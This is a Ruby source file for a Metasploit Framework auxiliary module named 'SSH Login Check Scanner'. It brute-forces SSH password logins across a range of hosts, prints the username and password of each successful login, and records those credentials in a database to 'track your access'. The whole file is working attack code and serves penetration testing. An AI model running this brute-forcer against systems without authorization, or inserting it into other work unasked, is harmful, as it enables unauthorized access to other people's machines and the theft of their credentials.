##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Report

	attr_accessor :ssh_socket, :good_credentials

	def initialize
		super(
			'Name'        => 'SSH Login Check Scanner',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module will test ssh logins on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => ['todb'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptBool.new('VERBOSE', [ true, 'Verbose output', false]),
				Opt::RPORT(22)
			], self.class
		)

		deregister_options('RHOST')

		@good_credentials = {}

	end

	def rport
		datastore['RPORT']
	end

	def do_logout
		self.ssh_socket.close if self.ssh_socket
		self.ssh_socket = nil
	end

	def do_login(ip,user,pass,port)
		begin
			self.ssh_socket = Net::SSH.start(
				ip,
				user,
				:password => pass,
				:auth_methods => ['password'],
				:port => port
			) 
		rescue Rex::ConnectionError
			return :connection_error
		rescue Net::SSH::Exception 
			return :fail # For whatever reason. Can't tell if passwords are on/off without timing responses.
		end
		if self.ssh_socket
			do_logout
			return :success
		else
			return :fail
		end
	end

	def do_report(ip,user,pass,port)
		report_service(:host => ip, :port => rport, :name => 'ssh')
		report_auth_info(:host => ip, :port => rport, :proto => 'ssh', :user => user, :pass => pass)
	end

	def run_host(ip)
		print_status("#{ip}:#{rport} - SSH - Starting buteforce")
		each_user_pass do |user, pass|
			this_cred = [user,ip,rport].join(":")
			next if self.credentials_tried[this_cred] == pass || self.credentials_good[this_cred]
			self.credentials_tried[this_cred] = pass
			case do_login(ip,user,pass,rport)
			when :success
				print_good "#{ip}:#{rport} - SSH - Success: '#{user}':'#{pass}'"
				self.credentials_good[this_cred] = pass
				do_report(ip,user,pass,rport)
			when :connection_error
				print_error "#{ip}:#{rport} - Could not connect" if datastore['VERBOSE']
				return
			when :fail
				print_error "#{ip}:#{rport} - SSH - Failed: '#{user}':'#{pass}'" if datastore['VERBOSE']
			end
		end	
	end

end


